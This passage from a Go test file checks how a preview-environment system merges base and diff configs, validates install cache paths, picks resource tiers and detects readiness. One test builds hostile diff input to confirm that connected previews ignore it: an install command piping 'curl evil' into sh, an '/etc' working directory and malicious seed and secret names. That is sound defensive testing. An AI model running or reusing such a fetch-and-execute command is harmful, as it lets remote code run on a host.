	require.NoError(t, err, "ResolveConfig should succeed for valid configs")

	// Primary comes from base.
	if resolved.Primary != "frontend" {
		t.Errorf("Primary = %q, want %q", resolved.Primary, "frontend")
	}

	// Credentials and network from base.
	if resolved.Credentials.Mode != "none" {
		t.Errorf("Credentials.Mode = %q, want %q", resolved.Credentials.Mode, "none")
	}

	// Service runtime fields from diff.
	fe := resolved.Services["frontend"]
	if fe.Cwd != "frontend" {
		t.Errorf("frontend.Cwd = %q, want %q", fe.Cwd, "frontend")
	}
	if fe.Command[0] != "npm" || fe.Command[1] != "run" {
		t.Errorf("frontend.Command = %v, want [npm run dev]", fe.Command)
	}

	be := resolved.Services["backend"]
	if len(be.Command) != 3 || be.Command[2] != "--debug" {
		t.Errorf("backend.Command = %v, want [python app.py --debug]", be.Command)
	}

	// Infrastructure: template/inject from base, init_script from diff.
	db := resolved.Infrastructure["db"]
	if db.Template != "postgres-16" {
		t.Errorf("db.Template = %q, want %q", db.Template, "postgres-16")
	}
	if db.InitScript != "db/test_seed.sql" {
		t.Errorf("db.InitScript = %q, want %q (from diff)", db.InitScript, "db/test_seed.sql")
	}
	if len(db.InjectInto) != 1 || db.InjectInto[0] != "backend" {
		t.Errorf("db.InjectInto = %v, want [backend] (from base)", db.InjectInto)
	}

	require.NotNil(t, resolved.Install, "non-connected preview should allow diff install behavior")
	require.Equal(t, []string{"pnpm", "install", "--frozen-lockfile"}, resolved.Install.Command, "non-connected preview should use install command from diff")
	require.Equal(t, []string{"apps/*/node_modules"}, resolved.Install.CleanPaths[1:], "non-connected preview should use install cleanup paths from diff")
	require.Equal(t, diffCfg.Resources, resolved.Resources, "non-connected preview should use resource requirements from diff")
}

func TestResolveConfig_Connected_PinsEverythingToBase(t *testing.T) {
	t.Parallel()

	baseCfg := &models.PreviewConfig{
		Version: "3",
		Primary: "frontend",
		Install: &models.PreviewInstallConfig{
			Command:    []string{"npm", "ci"},
			Lockfiles:  []string{"package-lock.json"},
			CleanPaths: []string{"node_modules"},
		},
		Services: map[string]models.ServiceConfig{
			"frontend": {Command: []string{"npm", "start"}, Port: 3000, Ready: models.ReadinessProbe{HTTPPath: "/"}},
		},
		Infrastructure: map[string]models.InfrastructureConfig{
			"db": {Template: "postgres-16", InitScript: "db/base_seed.sql"},
		},
		Resources: models.PreviewResourceRequirements{
			Limits: models.PreviewResourceList{CPU: "500m", Memory: "512Mi", EphemeralStorage: "5Gi"},
		},
		Credentials: models.CredentialConfig{Mode: "managed_env", CredentialSet: "staging"},
		Secrets: []models.PreviewSecretBundleRef{
			{Bundle: "base-secrets", Services: []string{"frontend"}, Env: []string{"DATABASE_URL"}, Files: []string{"development.conf.json"}},
		},
		Network: models.NetworkConfig{Mode: "managed", Destinations: []string{"staging_db"}},
	}

	diffCfg := &models.PreviewConfig{
		Install: &models.PreviewInstallConfig{
			Command:    []string{"sh", "-c", "curl evil | sh"},
			CleanPaths: []string{"."},
		},
		Services: map[string]models.ServiceConfig{
			"frontend": {Command: []string{"npm", "run", "malicious"}, Port: 9999, Cwd: "/etc"},
		},
		Infrastructure: map[string]models.InfrastructureConfig{
			"db": {Template: "postgres-16", InitScript: "db/malicious.sql"},
		},
		Resources: models.PreviewResourceRequirements{
			Limits: models.PreviewResourceList{CPU: "2", Memory: "1Gi", EphemeralStorage: "10Gi"},
		},
		Secrets: []models.PreviewSecretBundleRef{
			{Bundle: "diff-secrets", Services: []string{"frontend"}, Env: []string{"EVIL_DATABASE_URL"}, Files: []string{"config/evil.json"}},
		},
	}

	resolved, err := ResolveConfig(baseCfg, diffCfg)
	require.NoError(t, err, "ResolveConfig should succeed for valid configs")

	// All service fields pinned to base.
	fe := resolved.Services["frontend"]
	if fe.Command[0] != "npm" || fe.Command[1] != "start" {
		t.Errorf("Command = %v, want [npm start] (pinned to base)", fe.Command)
	}
	if fe.Port != 3000 {
		t.Errorf("Port = %d, want 3000 (pinned to base)", fe.Port)
	}

	// init_script pinned to base for connected config.
	db := resolved.Infrastructure["db"]
	if db.InitScript != "db/base_seed.sql" {
		t.Errorf("InitScript = %q, want %q (pinned to base for connected)", db.InitScript, "db/base_seed.sql")
	}

	require.NotNil(t, resolved.Install, "connected preview should preserve base install config")
	require.Equal(t, []string{"npm", "ci"}, resolved.Install.Command, "connected preview should pin install command to base")
	require.Equal(t, baseCfg.Resources, resolved.Resources, "connected preview should pin resource requirements to base")
	require.Equal(t, baseCfg.Secrets, resolved.Secrets, "connected preview should pin secret bundle refs to base")
}

func TestResolvePreviewInstallCachePaths(t *testing.T) {
	t.Parallel()

	disabled := false
	tests := []struct {
		name    string
		install *models.PreviewInstallConfig
		want    []string
		enabled bool
	}{
		{
			name: "defaults to clean paths",
			install: &models.PreviewInstallConfig{
				Lockfiles:  []string{"package-lock.json"},
				CleanPaths: []string{"node_modules"},
			},
			want:    []string{"node_modules"},
			enabled: true,
		},
		{
			name: "infers nested javascript dependency path",
			install: &models.PreviewInstallConfig{
				Lockfiles: []string{"frontend/package-lock.json"},
			},
			want:    []string{"frontend/node_modules"},
			enabled: true,
		},
		{
			name: "infers nested python dependency path",
			install: &models.PreviewInstallConfig{
				Lockfiles: []string{"services/api/poetry.lock"},
			},
			want:    []string{"services/api/.venv"},
			enabled: true,
		},
		{
			name: "infers go vendor dependency path",
			install: &models.PreviewInstallConfig{
				Lockfiles: []string{"go.mod"},
			},
			want:    []string{"vendor"},
			enabled: true,
		},
		{
			name: "adds explicit cache paths and deduplicates",
			install: &models.PreviewInstallConfig{
				Lockfiles:  []string{"package-lock.json"},
				CleanPaths: []string{"node_modules"},
				Cache: &models.PreviewInstallCacheConfig{
					Paths: []string{".next/cache", "node_modules"},
				},
			},
			want:    []string{".next/cache", "node_modules"},
			enabled: true,
		},
		{
			name: "excludes preview marker child clean path glob",
			install: &models.PreviewInstallConfig{
				Lockfiles:  []string{"Cargo.lock"},
				CleanPaths: []string{".143/cache/preview-install*/*"},
			},
			enabled: false,
		},
		{
			name: "explicit opt out disables paths",
			install: &models.PreviewInstallConfig{
				Lockfiles:  []string{"package-lock.json"},
				CleanPaths: []string{"node_modules"},
				Cache:      &models.PreviewInstallCacheConfig{Enabled: &disabled},
			},
			enabled: false,
		},
		{
			name: "missing lockfiles disables cache",
			install: &models.PreviewInstallConfig{
				CleanPaths: []string{"node_modules"},
			},
			enabled: false,
		},
		{
			name: "unknown lockfiles without paths disables cache",
			install: &models.PreviewInstallConfig{
				Lockfiles: []string{"Cargo.lock"},
			},
			enabled: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()

			got, enabled := ResolvePreviewInstallCachePaths(tt.install)
			require.Equal(t, tt.enabled, enabled, "cache resolver should return expected enabled state")
			require.Equal(t, tt.want, got, "cache resolver should return expected effective paths")
		})
	}
}

func TestValidateConfig_PreviewInstallCache(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name    string
		install *models.PreviewInstallConfig
		wantErr string
	}{
		{
			name: "valid cache path",
			install: &models.PreviewInstallConfig{
				Command:   []string{"npm", "ci"},
				Lockfiles: []string{"package-lock.json"},
				Cache:     &models.PreviewInstallCacheConfig{Paths: []string{".next/cache"}},
			},
		},
		{
			name: "cache paths require lockfiles",
			install: &models.PreviewInstallConfig{
				Command: []string{"npm", "ci"},
				Cache:   &models.PreviewInstallCacheConfig{Paths: []string{".next/cache"}},
			},
			wantErr: "preview.install.cache.paths requires preview.install.lockfiles",
		},
		{
			name: "rejects absolute path",
			install: &models.PreviewInstallConfig{
				Command:   []string{"npm", "ci"},
				Lockfiles: []string{"package-lock.json"},
				Cache:     &models.PreviewInstallCacheConfig{Paths: []string{"/tmp/cache"}},
			},
			wantErr: "must be a relative path",
		},
		{
			name: "rejects traversal",
			install: &models.PreviewInstallConfig{
				Command:   []string{"npm", "ci"},
				Lockfiles: []string{"package-lock.json"},
				Cache:     &models.PreviewInstallCacheConfig{Paths: []string{"../cache"}},
			},
			wantErr: "escapes the repo root",
		},
		{
			name: "rejects git",
			install: &models.PreviewInstallConfig{
				Command:   []string{"npm", "ci"},
				Lockfiles: []string{"package-lock.json"},
				Cache:     &models.PreviewInstallCacheConfig{Paths: []string{".git/modules"}},
			},
			wantErr: "must not target .git",
		},
		{
			name: "rejects marker path",
			install: &models.PreviewInstallConfig{
				Command:   []string{"npm", "ci"},
				Lockfiles: []string{"package-lock.json"},
				Cache:     &models.PreviewInstallCacheConfig{Paths: []string{".143/cache/preview-install"}},
			},
			wantErr: "must not target preview install markers",
		},
		{
			name: "rejects marker parent path",
			install: &models.PreviewInstallConfig{
				Command:   []string{"npm", "ci"},
				Lockfiles: []string{"package-lock.json"},
				Cache:     &models.PreviewInstallCacheConfig{Paths: []string{".143/cache"}},
			},
			wantErr: "must not target preview install markers",
		},
		{
			name: "rejects broad path",
			install: &models.PreviewInstallConfig{
				Command:   []string{"npm", "ci"},
				Lockfiles: []string{"package-lock.json"},
				Cache:     &models.PreviewInstallCacheConfig{Paths: []string{"."}},
			},
			wantErr: "too broad to cache",
		},
		{
			name: "rejects glob cache path",
			install: &models.PreviewInstallConfig{
				Command:   []string{"npm", "ci"},
				Lockfiles: []string{"package-lock.json"},
				Cache:     &models.PreviewInstallCacheConfig{Paths: []string{".pnpm-store/*"}},
			},
			wantErr: "glob paths are not allowed",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()

			cfg := validPreviewConfig()
			cfg.Install = tt.install
			errs := ValidateConfig(cfg)
			if tt.wantErr == "" {
				require.Empty(t, errs, "preview install cache config should validate")
				return
			}
			require.NotEmpty(t, errs, "preview install cache config should be rejected")
			require.Contains(t, strings.Join(errs, "; "), tt.wantErr, "validation error should explain the invalid cache config")
		})
	}
}

func TestParseNamedConfig_InstallCacheFieldMerge(t *testing.T) {
	t.Parallel()

	enabled := true
	_ = enabled
	raw := []byte(`{
		"preview": {
			"install": {
				"command": ["npm", "ci"],
				"lockfiles": ["package-lock.json"],
				"clean_paths": ["node_modules"],
				"cache": {"enabled": true, "paths": [".next/cache"]}
			},
			"services": {
				"web": {"command": ["npm", "run", "dev"], "port": 3000, "ready": {"http_path": "/"}}
			},
			"primary": "web",
			"default": "web",
			"configs": {
				"web": {"name": "web"},
				"docs": {
					"name": "docs",
					"install": {"cache": {"enabled": false}},
					"services": {
						"web": {"command": ["npm", "run", "docs"], "port": 3000, "ready": {"http_path": "/"}}
					},
					"primary": "web"
				},
				"turbo": {
					"name": "turbo",
					"install": {"cache": {"paths": [".turbo/cache"]}}
				}
			}
		}
	}`)

	docs, err := ParseNamedConfig(raw, "docs")
	require.NoError(t, err, "named config with cache.enabled override should parse")
	require.NotNil(t, docs.Install.Cache, "named config should preserve cache object")
	require.NotNil(t, docs.Install.Cache.Enabled, "named config should preserve explicit enabled override")
	require.False(t, *docs.Install.Cache.Enabled, "named cache.enabled should override base enabled")
	require.Equal(t, []string{".next/cache"}, docs.Install.Cache.Paths, "named cache.enabled-only override should inherit base cache paths")

	turbo, err := ParseNamedConfig(raw, "turbo")
	require.NoError(t, err, "named config with cache.paths override should parse")
	require.NotNil(t, turbo.Install.Cache.Enabled, "named cache.paths-only override should inherit base enabled")
	require.True(t, *turbo.Install.Cache.Enabled, "base cache.enabled should remain visible")
	require.Equal(t, []string{".turbo/cache"}, turbo.Install.Cache.Paths, "named cache.paths should replace base cache paths")
}

func TestResolveConfig_DiffCannotAddServices(t *testing.T) {
	t.Parallel()

	baseCfg := &models.PreviewConfig{
		Version: "3",
		Primary: "app",
		Services: map[string]models.ServiceConfig{
			"app": {Command: []string{"npm"}, Port: 3000, Ready: models.ReadinessProbe{HTTPPath: "/"}},
		},
		Infrastructure: map[string]models.InfrastructureConfig{},
		Credentials:    models.CredentialConfig{Mode: "none"},
	}

	diffCfg := &models.PreviewConfig{
		Services: map[string]models.ServiceConfig{
			"app":     {Command: []string{"npm", "dev"}, Port: 3000, Ready: models.ReadinessProbe{HTTPPath: "/"}},
			"sneaked": {Command: []string{"evil"}, Port: 6666, Ready: models.ReadinessProbe{HTTPPath: "/"}},
		},
	}

	resolved, err := ResolveConfig(baseCfg, diffCfg)
	require.NoError(t, err, "ResolveConfig should succeed for valid configs")

	// Only services from base should exist.
	if len(resolved.Services) != 1 {
		t.Errorf("len(Services) = %d, want 1 (diff cannot add services)", len(resolved.Services))
	}
	if _, ok := resolved.Services["sneaked"]; ok {
		t.Error("diff-added service 'sneaked' should not appear in resolved config")
	}
}

func TestResolveConfig_NonConnectedCanRemoveInstall(t *testing.T) {
	t.Parallel()

	baseCfg := &models.PreviewConfig{
		Version: "3",
		Primary: "app",
		Install: &models.PreviewInstallConfig{
			Command:    []string{"npm", "ci"},
			Lockfiles:  []string{"package-lock.json"},
			CleanPaths: []string{"node_modules"},
		},
		Services: map[string]models.ServiceConfig{
			"app": {Command: []string{"npm"}, Port: 3000, Ready: models.ReadinessProbe{HTTPPath: "/"}},
		},
		Infrastructure: map[string]models.InfrastructureConfig{},
		Credentials:    models.CredentialConfig{Mode: "none"},
	}
	diffCfg := &models.PreviewConfig{
		Services: map[string]models.ServiceConfig{
			"app": {Command: []string{"go", "run", "."}, Port: 3000, Ready: models.ReadinessProbe{HTTPPath: "/"}},
		},
		Infrastructure: map[string]models.InfrastructureConfig{},
	}

	resolved, err := ResolveConfig(baseCfg, diffCfg)
	require.NoError(t, err, "ResolveConfig should succeed for valid configs")

	require.Nil(t, resolved.Install, "non-connected preview should use nil install from diff instead of keeping stale base install")
	require.Equal(t, []string{"go", "run", "."}, resolved.Services["app"].Command, "non-connected preview should still resolve runtime service fields from diff")
}

func TestIsConnected(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name string
		cfg  models.PreviewConfig
		want bool
	}{
		{
			name: "mode none",
			cfg:  models.PreviewConfig{Credentials: models.CredentialConfig{Mode: "none"}},
			want: false,
		},
		{
			name: "mode empty",
			cfg:  models.PreviewConfig{Credentials: models.CredentialConfig{Mode: ""}},
			want: false,
		},
		{
			name: "managed_env",
			cfg:  models.PreviewConfig{Credentials: models.CredentialConfig{Mode: "managed_env"}},
			want: true,
		},
		{
			name: "has destinations",
			cfg:  models.PreviewConfig{Network: models.NetworkConfig{Destinations: []string{"db"}}},
			want: true,
		},
		{
			name: "has secret bundle",
			cfg:  models.PreviewConfig{Secrets: []models.PreviewSecretBundleRef{{Bundle: "repo-dev", Services: []string{"app"}}}},
			want: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			if got := IsConnected(&tt.cfg); got != tt.want {
				t.Errorf("IsConnected() = %v, want %v", got, tt.want)
			}
		})
	}
}

func TestDetectReadiness(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name      string
		cfg       models.PreviewConfig
		wantReady models.PreviewReadiness
	}{
		{
			name: "ready - simple config",
			cfg: models.PreviewConfig{
				Primary:        "app",
				Services:       map[string]models.ServiceConfig{"app": {Command: []string{"npm"}, Port: 3000, Ready: models.ReadinessProbe{HTTPPath: "/"}}},
				Infrastructure: map[string]models.InfrastructureConfig{},
				Credentials:    models.CredentialConfig{Mode: "none"},
			},
			wantReady: models.PreviewReadinessReady,
		},
		{
			name: "admin setup - has credentials",
			cfg: models.PreviewConfig{
				Primary:        "app",
				Services:       map[string]models.ServiceConfig{"app": {Command: []string{"npm"}, Port: 3000, Ready: models.ReadinessProbe{HTTPPath: "/"}}},
				Infrastructure: map[string]models.InfrastructureConfig{},
				Credentials:    models.CredentialConfig{Mode: "managed_env", CredentialSet: "staging", Env: []string{"DB_URL"}},
			},
			wantReady: models.PreviewReadinessAdminSetupRequired,
		},
		{
			name: "admin setup - has destinations",
			cfg: models.PreviewConfig{
				Primary:        "app",
				Services:       map[string]models.ServiceConfig{"app": {Command: []string{"npm"}, Port: 3000, Ready: models.ReadinessProbe{HTTPPath: "/"}}},
				Infrastructure: map[string]models.InfrastructureConfig{},
				Network:        models.NetworkConfig{Mode: "managed", Destinations: []string{"staging_db"}},
			},
			wantReady: models.PreviewReadinessAdminSetupRequired,
		},
		{
			name: "not supported - invalid config",
			cfg: models.PreviewConfig{
				Primary:        "missing",
				Services:       map[string]models.ServiceConfig{"app": {Command: []string{"npm"}, Port: 3000, Ready: models.ReadinessProbe{HTTPPath: "/"}}},
				Infrastructure: map[string]models.InfrastructureConfig{},
			},
			wantReady: models.PreviewReadinessNotSupported,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			result := DetectReadiness(&tt.cfg)
			if result.Readiness != tt.wantReady {
				t.Errorf("Readiness = %q, want %q (errors: %v)", result.Readiness, tt.wantReady, result.ValidationErrors)
			}
		})
	}
}

func TestResolveResourceLimits(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name     string
		cfg      models.PreviewConfig
		expected models.ResourceLimits
	}{
		{
			name: "single service uses small preview tier",
			cfg: models.PreviewConfig{
				Services: map[string]models.ServiceConfig{"app": {}},
			},
			expected: models.ResourceLimits{MemoryMiB: 1024, CPUMillis: 500, DiskMiB: 10 * 1024},
		},
		{
			name: "multi service without managed infrastructure uses standard preview tier",
			cfg: models.PreviewConfig{
				Services: map[string]models.ServiceConfig{"a": {}, "b": {}},
			},
			expected: models.ResourceLimits{MemoryMiB: 2048, CPUMillis: 1000, DiskMiB: 10 * 1024},
		},
		{
			name: "multi service with managed infrastructure uses heavy preview tier",
			cfg: models.PreviewConfig{
				Services: map[string]models.ServiceConfig{"frontend": {}, "server": {}},
				Infrastructure: map[string]models.InfrastructureConfig{
					"db": {Template: "postgres-17"},
				},
			},
			expected: models.ResourceLimits{MemoryMiB: 4096, CPUMillis: 2000, DiskMiB: 10 * 1024},
		},
		{
			name: "requests override topology defaults when limits are omitted",
			cfg: models.PreviewConfig{
				Services: map[string]models.ServiceConfig{"app": {}},
				Resources: models.PreviewResourceRequirements{
					Requests: models.PreviewResourceList{CPU: "750m", Memory: "512Mi", EphemeralStorage: "5Gi"},
				},
			},
			expected: models.ResourceLimits{MemoryMiB: 512, CPUMillis: 750, DiskMiB: 5 * 1024},
		},
		{
			name: "limits override requests",
			cfg: models.PreviewConfig{
				Services: map[string]models.ServiceConfig{"app": {}},
				Resources: models.PreviewResourceRequirements{
					Requests: models.PreviewResourceList{CPU: "500m", Memory: "512Mi", EphemeralStorage: "5Gi"},
					Limits:   models.PreviewResourceList{CPU: "1.5", Memory: "1Gi", EphemeralStorage: "10gb"},
				},
			},
			expected: models.ResourceLimits{MemoryMiB: 1024, CPUMillis: 1500, DiskMiB: 9537},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			require.Equal(t, tt.expected, ResolveResourceLimits(&tt.cfg), "resource tier should match preview topology")
		})
	}
}

func TestApplyResourceLimitsToSandboxConfig(t *testing.T) {
	t.Parallel()

	cfg := &models.PreviewConfig{
		Services: map[string]models.ServiceConfig{
			"frontend": {},
			"server":   {},
		},
		Infrastructure: map[string]models.InfrastructureConfig{
			"db": {Template: "postgres-17"},
		},
	}
	sandboxCfg := agent.DefaultSandboxConfig()

	ApplyResourceLimitsToSandboxConfig(&sandboxCfg, cfg)

	require.Equal(t, 4096, sandboxCfg.MemoryLimitMB, "sandbox config should use the preview topology memory tier")
	require.Equal(t, 2.0, sandboxCfg.CPULimit, "sandbox config should convert preview millicores into CPU cores")
	require.Equal(t, 10, sandboxCfg.DiskLimitGB, "sandbox config should round preview disk MiB up to whole GiB")
}

func TestApplyResourceLimitsToSandboxConfig_RoundsDiskUp(t *testing.T) {
	t.Parallel()

	cfg := &models.PreviewConfig{
		Services: map[string]models.ServiceConfig{"app": {}},
		Resources: models.PreviewResourceRequirements{
			Limits: models.PreviewResourceList{EphemeralStorage: "1537Mi"},
		},
	}
	sandboxCfg := agent.DefaultSandboxConfig()

	ApplyResourceLimitsToSandboxConfig(&sandboxCfg, cfg)

	require.Equal(t, 2, sandboxCfg.DiskLimitGB, "sandbox config should round non-whole GiB disk limits up for Docker quota support")
}

func TestLookupInfraTemplate(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name  string
		found bool
	}{
		{"postgres-17", true},
		{"postgres-16", true},
		{"redis-7", true},
		{"mysql-8", true},
		{"elasticsearch-8", false},
		{"kafka-3", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			_, ok := LookupInfraTemplate(tt.name)
			if ok != tt.found {
				t.Errorf("LookupInfraTemplate(%q) found = %v, want %v", tt.name, ok, tt.found)
			}
		})
	}
}

func TestParseConfig_RoundTrip(t *testing.T) {
	t.Parallel()

	// Parse, then marshal back, then parse again — should be equivalent.
	raw := `{
		"version": "3",
		"name": "frontend",
		"command": ["npm", "run", "dev"],
		"port": 3000,
		"ready": {"http_path": "/"},
		"credentials": {"mode": "none"},
		"network": {"mode": "managed"}
	}`

	cfg1, err := ParseConfig([]byte(raw))
	if err != nil {
		t.Fatalf("first parse: %v", err)
	}

	data, err := json.Marshal(cfg1)
	if err != nil {
		t.Fatalf("marshal: %v", err)
	}

	// The marshaled form is in multi-service format, so parse it as such.
	cfg2 := &models.PreviewConfig{}
	if err := json.Unmarshal(data, cfg2); err != nil {
		t.Fatalf("unmarshal: %v", err)
	}

	if cfg1.Primary != cfg2.Primary {
		t.Errorf("Primary mismatch: %q vs %q", cfg1.Primary, cfg2.Primary)
	}
	if len(cfg1.Services) != len(cfg2.Services) {
		t.Errorf("Services count mismatch: %d vs %d", len(cfg1.Services), len(cfg2.Services))
	}
}

// TestParseConfig_CommittedDogfoodConfig guards against silent regressions
// in the committed repo preview config at the repo root. The dogfood config
// is the configuration used when a 143 session on this very repo clicks
// "Start Preview", so a broken file manifests as a broken developer loop.
func TestParseConfig_CommittedDogfoodConfig(t *testing.T) {
	t.Parallel()

	// Walk up from the package dir to the repo root (where `.143/` lives).
	dir, err := os.Getwd()
	if err != nil {
		t.Fatalf("getwd: %v", err)
	}
	for {
		candidate := filepath.Join(dir, ".143", "config.json")
		if _, err := os.Stat(candidate); err == nil {
			raw, err := os.ReadFile(candidate)
			if err != nil {
				t.Fatalf("read %s: %v", candidate, err)
			}
			cfg, err := ParseConfig(raw)
			require.NoError(t, err, "committed .143/config.json should parse")
			frontend, ok := cfg.Services["frontend"]
			require.True(t, ok, "dogfood preview config should define the frontend service")
			require.Contains(t, frontend.Env, "NEXT_PUBLIC_API_URL", "dogfood preview should explicitly neutralize public API origin inherited from the surrounding environment")
			require.Equal(t, "", frontend.Env["NEXT_PUBLIC_API_URL"], "dogfood preview must force same-origin API calls so preview CSRF cookies match the request origin")
			server, ok := cfg.Services["server"]
			require.True(t, ok, "dogfood preview config should define the server service")
			require.Equal(t, "api", server.Env["MODE"], "dogfood preview server should avoid worker mode because the sandbox has no Docker socket")
			require.Equal(t, "0", server.Env["PREVIEW_GATEWAY_PORT"], "dogfood preview server should disable the nested preview gateway to avoid binding the platform preview port")
			return
		}
		parent := filepath.Dir(dir)
		if parent == dir {
			t.Skip("repo root .143/config.json not found from test working directory")
		}
		dir = parent
	}
}

func TestCommittedDogfoodFrontendScriptBindsExternally(t *testing.T) {
	t.Parallel()

	// Walk up from the package dir to the repo root (where `.143/` lives).
	dir, err := os.Getwd()
	require.NoError(t, err, "test should resolve the package working directory")
	for {
		candidate := filepath.Join(dir, ".143", "preview-frontend.sh")
		if _, err := os.Stat(candidate); err == nil {
			raw, err := os.ReadFile(candidate)
			require.NoError(t, err, "test should read committed dogfood frontend preview script")
			require.Contains(t, string(raw), "HOSTNAME=0.0.0.0", "dogfood Next preview must bind externally so the worker proxy can dial the sandbox IP")
			require.Contains(t, string(raw), "npm run build", "dogfood Next preview should run a production build before serving")
			require.Contains(t, string(raw), "package-lock.json", "dogfood Next preview should key dependency install reuse to the lockfile")
			require.Contains(t, string(raw), ".143-npm-ci-lock", "dogfood Next preview should only skip npm ci after a successful lockfile-matched install marker")
			require.Contains(t, string(raw), "node_modules/.bin/next", "dogfood Next preview should verify the expected Next binary exists before reusing installed deps")
			require.Contains(t, string(raw), "rm -rf node_modules", "dogfood Next preview should clean partial dependency installs before retrying npm ci")
			require.Contains(t, string(raw), "cp -R .next/static .next/standalone/frontend/.next/static", "dogfood Next preview should stage generated CSS and other static chunks next to the standalone server")
			require.Contains(t, string(raw), "cp -R public .next/standalone/frontend/public", "dogfood Next preview should stage public assets next to the standalone server")
			require.Contains(t, string(raw), "node .next/standalone/frontend/server.js", "dogfood Next preview should serve the standalone production build")
			require.NotContains(t, string(raw), "npm run dev", "dogfood Next preview must avoid dev server HMR in the preview gateway")
			return
		}
		parent := filepath.Dir(dir)
		if parent == dir {
			t.Skip("repo root .143/preview-frontend.sh not found from test working directory")
		}
		dir = parent
	}
}
